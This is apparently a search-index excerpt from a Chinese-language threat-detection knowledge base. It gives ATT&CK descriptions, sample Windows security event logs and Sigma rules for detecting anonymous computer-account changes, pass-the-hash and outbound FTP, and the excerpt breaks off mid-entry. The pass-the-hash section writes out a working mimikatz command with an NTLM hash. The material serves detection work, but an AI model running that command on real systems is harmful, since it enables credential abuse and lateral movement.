<p>\u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u8fdc\u7a0b\u7cfb\u7edf\u662f\u5426\u5904\u4e8e\u6613\u53d7\u653b\u51fb\u72b6\u6001\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u626b\u63cf\u6216\u5176\u4ed6\u53d1\u73b0\u65b9\u6cd5\u6765\u5b8c\u6210\uff0c\u4ee5\u5bfb\u627e\u5728\u7f51\u7edc\u4e2d\u90e8\u7f72\u7684\u5e38\u89c1\u6613\u53d7\u653b\u51fb\u8f6f\u4ef6\uff0c\u68c0\u6d4b\u6216\u5305\u542b\u8fdc\u7a0b\u5229\u7528\u7684\u6f0f\u6d1e\u6216\u5b89\u5168\u8f6f\u4ef6\u3002\u670d\u52a1\u5668\u53ef\u80fd\u662f\u6a2a\u5411\u79fb\u52a8\u4e2d\u7684\u9ad8\u4ef7\u503c\u76ee\u6807\uff0c\u4f46\u662f\u5982\u679c\u7aef\u70b9\u7cfb\u7edf\u63d0\u4f9b\u8bbf\u95ee\u5176\u4ed6\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5219\u7aef\u70b9\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5904\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002</p> <p>\u5e38\u89c1\u670d\u52a1\uff08\u4f8b\u5982SMB\u548cRDP\uff09\u4ee5\u53ca\u53ef\u80fd\u5728\u5185\u90e8\u7f51\u7edc\uff08\u4f8b\u5982MySQL\uff09\u548cWeb\u670d\u52a1\u5668\u670d\u52a1\u4e2d\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u6f0f\u6d1e\u3002</p> <p>\u6839\u636e\u6613\u53d7\u653b\u51fb\u7684\u8fdc\u7a0b\u670d\u52a1\u7684\u6743\u9650\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u7531\u4e8e\u6a2a\u5411\u79fb\u52a8\u5229\u7528\u800c\u5b9e\u73b0\u5bf9\u7279\u6743\u5347\u7ea7\u7684\u5229\u7528\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u53c2\u8003\u8d44\u6599\u5982\u4e0b\uff1a</p> <p>https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b</p> <p>windows server 2016/win10</p> <p>EventID\uff1a4742</p> <pre><code>A computer account was changed.\n\nSubject:\n\nSecurity ID:  ACME\\Administrator\nAccount Name:  Administrator\nAccount Domain:  ACME\nLogon ID:  0x27a79\n\nComputer Account That Was Changed:\n\nSecurity ID:  S-1-5-21-3108364787-189202583-342365621-1109\nAccount Name:  WS2321$\nAccount Domain:  ACME\n\n\nChanged Attributes:\n\nSAM Account Name: -\nDisplay Name:  -\nUser Principal Name: -\nHome Directory:  -\nHome Drive:  -\nScript Path:  -\nProfile Path:  -\nUser Workstations: -\nPassword Last Set: -\nAccount Expires:  -\nPrimary Group ID: -\nAllowedToDelegateTo: -\nOld UAC Value:  0x85\nNew UAC Value:  0x84\nUser Account Control: \nAccount Enabled\nUser Parameters: -\nSID History:  -\nLogon Hours:  -\nDNS Host Name:  -\nService Principal Names: -\n\nAdditional Information:\n\nPrivileges:  -\n</code></pre> <p>EventID\uff1a4624</p> <pre><code>An account was successfully logged on.\n\nSubject:\n    Security ID: SYSTEM\n    Account Name: DESKTOP-LLHJ389$\n    Account Domain: WORKGROUP\n    Logon ID: 0x3E7\n\nLogon Information:\n    Logon Type: 7\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: No\n\nImpersonation Level: Impersonation\n\nNew Logon:\n    Security ID: AzureAD\\RandyFranklinSmith\n    Account Name: rsmith@montereytechgroup.com\n    Account Domain: AzureAD\n    Logon ID: 0xFD5113F\n    Linked Logon ID: 0xFD5112A\n    Network Account Name: -\n    Network Account Domain: -\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n\nProcess Information:\n    Process ID: 0x30c\n    Process Name: C:\\Windows\\System32\\lsass.exe\n\nNetwork Information:\n    Workstation Name: DESKTOP-LLHJ389\n    Source Network Address: -\n    Source Port: -\n\nDetailed Authentication Information:\n    Logon Process: Negotiat\n    Authentication Package: Negotiate\n    Transited Services: -\n    Package Name (NTLM only): -\n    Key Length: 0\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528\ndescription: \u901a\u8fc7windows\u5b89\u5168\u65e5\u5fd7\uff0c\u68c0\u6d4b\u533f\u540d\u7528\u6237\u66f4\u6539\u7684\u4f7f\u7528\u3002\ntags: T1210\nstatus: experimental\nreferences:\n    - https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_computer_changed_with_anonymous_account.yml\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: \n             - \u201c4742\u201d\n             - \u201c4624\u201d\n        Account Name: \u201cANONYMOUSLOGON\u201d\n        Logon Type: 3\n\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u6b64\u641c\u7d22\u9700\u8981\u542f\u7528\u5ba1\u6838\u8ba1\u7b97\u673a\u5e10\u6237\u7ba1\u7406\u5728\u7cfb\u7edf\u4e0a\u751f\u6210\u4e8b\u4ef6ID4742\u3002\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u60a8\u6307\u5b9a\u7279\u5b9a\u4e8e\u73af\u5883\u7684\u914d\u7f6e\uff08\u7d22\u5f15\uff0c\u6e90\uff0c\u6e90\u7c7b\u578b\u7b49\uff09Windows\u4e8b\u4ef6\u65e5\u5fd7\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1210</p> <p>https://attack.mitre.org/techniques/T1210</p> <p>\u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528</p> <p>https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_computer_changed_with_anonymous_account.yml</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/","title":"T1550-002-windows-\u54c8\u5e0c\u4f20\u9012","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u88ab\u76d7\u7684\u5bc6\u7801\u54c8\u5e0c\u6765\u201c\u4f20\u9012\u54c8\u5e0c\u201d\uff0c\u4ece\u800c\u5728\u73af\u5883\u4e2d\u6a2a\u5411\u79fb\u52a8\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5e38\u7684\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u3002\u4f20\u9012\u54c8\u5e0c\uff08PtH\uff09\u662f\u4e00\u79cd\u65e0\u9700\u8bbf\u95ee\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u5373\u53ef\u4f5c\u4e3a\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u7684\u65b9\u6cd5\u3002\u6b64\u65b9\u6cd5\u7ed5\u8fc7\u9700\u8981\u660e\u6587\u5bc6\u7801\u7684\u6807\u51c6\u8eab\u4efd\u9a8c\u8bc1\u6b65\u9aa4\uff0c\u800c\u76f4\u63a5\u8fdb\u5165\u4f7f\u7528\u5bc6\u7801\u54c8\u5e0c\u7684\u8eab\u4efd\u9a8c\u8bc1\u90e8\u5206\u3002\u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u6b63\u5728\u4f7f\u7528\u7684\u5e10\u6237\u7684\u6709\u6548\u5bc6\u7801\u54c8\u5e0c\u3002\u6355\u83b7\u7684\u54c8\u5e0c\u4e0ePtH\u4e00\u8d77\u7528\u4e8e\u9a8c\u8bc1\u8be5\u7528\u6237\u8eab\u4efd\u3002\u4e00\u65e6\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff0cPtH\u53ef\u7528\u4e8e\u5728\u672c\u5730\u6216\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u6267\u884c\u64cd\u4f5c\u3002</p> <p>\u5177\u6709KB2871997\u7684Windows 7\u53ca\u66f4\u9ad8\u7248\u672c\u9700\u8981\u6709\u6548\u7684\u57df\u7528\u6237\u51ed\u636e\u6216RID 500\u7ba1\u7406\u5458\u54c8\u5e0c\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>passing the hash\uff0c\u4e2d\u6587\u4e00\u822c\u7ffb\u8bd1\u4e3ahash\u4f20\u9012\u653b\u51fb\uff0c\u5728windows\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u901a\u5e38\u4e0d\u4f1a\u5b58\u50a8\u7528\u6237\u767b\u5f55\u5bc6\u7801\uff0c\u800c\u662f\u5b58\u50a8\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff0c\u5728\u6211\u4eec\u8fdc\u7a0b\u767b\u5f55\u7cfb\u7edf\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u5411\u8fdc\u7a0b\u4f20\u9012\u7684\u5c31\u662f\u5bc6\u7801\u7684hash\u503c\u3002\u5f53\u653b\u51fb\u8005\u83b7\u53d6\u4e86\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u4e0a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684hash\u503c\u7684\u65f6\u5019\uff0c\u4ed6\u867d\u7136\u4e0d\u77e5\u9053\u5bc6\u7801\u503c\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a\uff0c\u901a\u8fc7\u4f20\u9001\u5bc6\u7801\u7684hash\u503c\u6765\u8fbe\u5230\u767b\u5f55\u7684\u76ee\u7684\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9776\u673a\u3001\u653b\u51fb\u673a\uff09</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_4","title":"\u57fa\u7840\u73af\u5883","text":"<p>DC\uff1awindows server 2008 R2</p> <p>PC1\uff1awindows server 2008 R2 \uff08\u76ee\u6807\u4e3b\u673a\uff09</p> <p>PC2\uff1awin 7 \uff08\u653b\u51fb\u673a\uff09</p> <p>Mimikatz \uff08\u6d4b\u8bd5\u5de5\u5177\uff09</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_5","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":"<p>1.\u83b7\u53d6\u76f8\u5173\u8d26\u6237\u7684NTLM\u54c8\u5e0c\uff0c\u5177\u4f53\u8fc7\u7a0b\u4e0d\u518d\u6f14\u793a\uff0cmimikatz\u5373\u53ef</p> <p>2.\u5229\u7528mimikatz\u8fdb\u884cPTH mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:xiaomi.org /ntlm:762c6fa6a9adb2f5ff215484bd8296b7\"</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#-pc1-pth","title":"\u76ee\u6807\u4e3b\u673a-PC1-PTH\u6210\u529f","text":"<pre><code>Event-ID: 4624\n\n\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002\n\n\u4f7f\u7528\u8005:\n\u5b89\u5168 ID: NULL SID\n\u5e10\u6237\u540d: -\n\u5e10\u6237\u57df: -\n\u767b\u5f55 ID: 0x0\n\n\u767b\u5f55\u7c7b\u578b: 3\n\n\u65b0\u767b\u5f55:\n\u5b89\u5168 ID: S-1-5-21-3576461989-1381017913-248049510-500\n\u5e10\u6237\u540d: Administrator\n\u5e10\u6237\u57df: XIAOMI\n\u767b\u5f55 ID: 0xF86B9\n\u767b\u5f55 GUID: {00000000-0000-0000-0000-000000000000}\n\n\u8fdb\u7a0b\u4fe1\u606f:\n\u8fdb\u7a0b ID: 0x0\n\u8fdb\u7a0b\u540d: -\n\n\u7f51\u7edc\u4fe1\u606f:\n\u5de5\u4f5c\u7ad9\u540d: 12306BR0-PC\n\u6e90\u7f51\u7edc\u5730\u5740: 192.168.66.88\n\u6e90\u7aef\u53e3: 49251\n\n\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f:\n\u767b\u5f55\u8fdb\u7a0b: NtLmSsp\n\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: NTLM\n\u4f20\u9012\u7684\u670d\u52a1: -\n\u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): NTLM V2\n\u5bc6\u94a5\u957f\u5ea6: 128\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#-pc1-pth_1","title":"\u76ee\u6807\u4e3b\u673a-PC1-PTH\u5931\u8d25","text":"<pre><code>Event-ID: 4625\n\n\u767b\u5f55\u5931\u8d25\u7684\u5e10\u6237:\n\u5b89\u5168 ID: NULL SID\n\u5e10\u6237\u540d: administrator\n\u5e10\u6237\u57df: xiaomi.org\n\n\u5931\u8d25\u4fe1\u606f:\n\u5931\u8d25\u539f\u56e0: \u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002\n\u72b6\u6001: 0xC000006D\n\u5b50\u72b6\u6001: 0xC000006A\n\n\u8fdb\u7a0b\u4fe1\u606f:\n\u8c03\u7528\u65b9\u8fdb\u7a0b ID: 0x0\n\u8c03\u7528\u65b9\u8fdb\u7a0b\u540d: -\n\n\u7f51\u7edc\u4fe1\u606f:\n\u5de5\u4f5c\u7ad9\u540d: 12306BR0-PC\n\u6e90\u7f51\u7edc\u5730\u5740: 192.168.66.88\n\u6e90\u7aef\u53e3: 49253\n\n\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f:\n\u767b\u5f55\u8fdb\u7a0b: NtLmSsp\n\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: NTLM\n\u4f20\u9012\u670d\u52a1: -\n\u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): -\n\u5bc6\u94a5\u957f\u5ea6: 0\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#-pc2","title":"\u653b\u51fb\u673a-PC2","text":"<pre><code>Event-ID: 4624\n\n\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002\n\n\u4f7f\u7528\u8005:\n\u5b89\u5168 ID: S-1-5-21-3579006141-3881886638-2121494774-1000\n\u5e10\u6237\u540d: 12306Br0\n\u5e10\u6237\u57df: 12306Br0-PC\n\u767b\u5f55 ID: 0x1AB7F9\n\n\u767b\u5f55\u7c7b\u578b: 9\n\n\u65b0\u767b\u5f55:\n\u5b89\u5168 ID: S-1-5-21-3579006141-3881886638-2121494774-1000\n\u5e10\u6237\u540d: 12306Br0\n\u5e10\u6237\u57df: 12306Br0-PC\n\u767b\u5f55 ID: 0x234995\n\u767b\u5f55 GUID: {00000000-0000-0000-0000-000000000000}\n\n\u8fdb\u7a0b\u4fe1\u606f:\n\u8fdb\u7a0b ID: 0x398\n\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\svchost.exe\n\n\u7f51\u7edc\u4fe1\u606f:\n\u5de5\u4f5c\u7ad9\u540d:\n\u6e90\u7f51\u7edc\u5730\u5740: ::1\n\u6e90\u7aef\u53e3: 0\n\n\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f:\n\u767b\u5f55\u8fdb\u7a0b: seclogo\n\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: Negotiate\n\u4f20\u9012\u7684\u670d\u52a1: -\n\u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): -\n\u5bc6\u94a5\u957f\u5ea6: 0\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Pass the Hash Activity\uff08\u76ee\u6807\u4e3b\u673a\uff09\nid: f8d98d6c-7a07-4d74-b064-dd4a3c244528\nstatus: experimental\ndescription: Detects the attack technique pass the hash which is used to move laterally inside the network\nreferences:\n    - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\nauthor: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method)\ndate: 2017/03/08\ntags:\n    - attack.lateral_movement\n    - attack.T1550-002\n    - car.2016-04-004\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        - EventID: 4624\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          WorkstationName: '%Workstations%'\n          ComputerName: '%Workstations%'\n        - EventID: 4625\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          WorkstationName: '%Workstations%'\n          ComputerName: '%Workstations%'\n    filter:\n        AccountName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: medium\n</code></pre> <pre><code>title: Pass the Hash Activity 2\uff08\u653b\u51fb\u673a\uff09\nid: 8eef149c-bd26-49f2-9e5a-9b00e3af499b\nstatus: production\ndescription: Detects the attack technique pass the hash which is used to move laterally inside the network\nreferences:\n    - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\n    - https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis\n    - https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/\nauthor: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)\ndate: 2019/06/14\ntags:\n    - attack.lateral_movement\n    - attack.T1550-002\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624\ndetection:\n    selection:\n        - EventID: 4624\n          SubjectUserSid: 'S-1-0-0'\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          KeyLength: '0'\n        - EventID: 4624 #\u672a\u6d4b\u8bd5\u89e6\u53d1\u6b64\u7279\u5f81\n          LogonType: '9'\n          LogonProcessName: 'seclogo'\n    filter:\n        AccountName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: medium\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_8","title":"\u5efa\u8bae","text":"<p>\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\u9a8c\u8bc1\u68c0\u6d4b\u6548\u679c\uff0c\u8c28\u614e\u4f7f\u7528\uff01</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1550-002</p> <p>https://attack.mitre.org/techniques/T1550/002/</p> <p>windows-\u54c8\u5e0c\u4f20\u90121</p> <p>https://github.com/12306Bro/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml</p> <p>windows-\u54c8\u5e0c\u4f20\u90122</p> <p>https://github.com/12306Bro/sigma/blob/master/rules/windows/builtin/win_pass_the_hash_2.yml</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/","title":"T1071-002-win-\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a","text":""},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e0e\u4f20\u8f93\u6587\u4ef6\u5173\u8054\u7684\u5e94\u7528\u7a0b\u5e8f\u5c42\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4ee5\u514d\u4e0e\u73b0\u6709\u6d41\u91cf\u6df7\u5728\u4e00\u8d77\u8fdb\u884c\u68c0\u6d4b\u7f51\u7edc\u8fc7\u6ee4\u3002\u8fdc\u7a0b\u7cfb\u7edf\u7684\u547d\u4ee4\uff08\u901a\u5e38\u662f\u8fd9\u4e9b\u547d\u4ee4\u7684\u7ed3\u679c\uff09\u5c06\u5d4c\u5165\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u534f\u8bae\u6d41\u91cf\u4e2d\u3002</p> <p>\u4f20\u8f93\u6587\u4ef6\u7684\u534f\u8bae\uff08\u4f8b\u5982FTP\uff0cFTPS\u548cTFTP\uff09\u5728\u73af\u5883\u4e2d\u53ef\u80fd\u5f88\u5e38\u89c1\u3002\u4ece\u8fd9\u4e9b\u534f\u8bae\u4ea7\u751f\u7684\u6570\u636e\u5305\u53ef\u80fd\u5177\u6709\u8bb8\u591a\u5b57\u6bb5\u548c\u6807\u5934\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u9690\u85cf\u6570\u636e\u3002\u6570\u636e\u4e5f\u53ef\u4ee5\u9690\u85cf\u5728\u4f20\u8f93\u7684\u6587\u4ef6\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u534f\u8bae\u4ee5\u4e0e\u53d7\u5bb3\u7f51\u7edc\u4e2d\u53d7\u5176\u63a7\u5236\u7684\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u540c\u65f6\u8fd8\u4f1a\u6a21\u4eff\u6b63\u5e38\u7684\u9884\u671f\u6d41\u91cf\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u68c0\u6d4b\u53ef\u80fd\u4f7f\u7528FTP\u7f51\u7edc\u8fde\u63a5\u5230Internet\u7684\u4e8b\u4ef6\u3002\u81ea1980\u5e74\u4ee3\u4ee5\u6765\uff0c\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff08FTP\uff09\u4e00\u76f4\u4ee5\u5176\u5f53\u524d\u5f62\u5f0f\u51fa\u73b0\u3002\u5728\u7f51\u7edc\u4e0a\u53d1\u9001\u548c\u63a5\u6536\u6587\u4ef6\u53ef\u80fd\u662f\u5e38\u89c1\u4e14\u6709\u6548\u7684\u8fc7\u7a0b\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u8fd8\u7ecf\u5e38\u4f7f\u7528\u6b64\u534f\u8bae\u4ece\u60a8\u7684\u7f51\u7edc\u4e2d\u7a83\u53d6\u6570\u636e\u6216\u4e0b\u8f7d\u65b0\u5de5\u5177\u3002\u6b64\u5916\uff0cFTP\u662f\u7eaf\u6587\u672c\u534f\u8bae\uff0c\u5982\u679c\u88ab\u62e6\u622a\uff0c\u5219\u53ef\u80fd\u4f1a\u516c\u5f00\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002</p>"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%A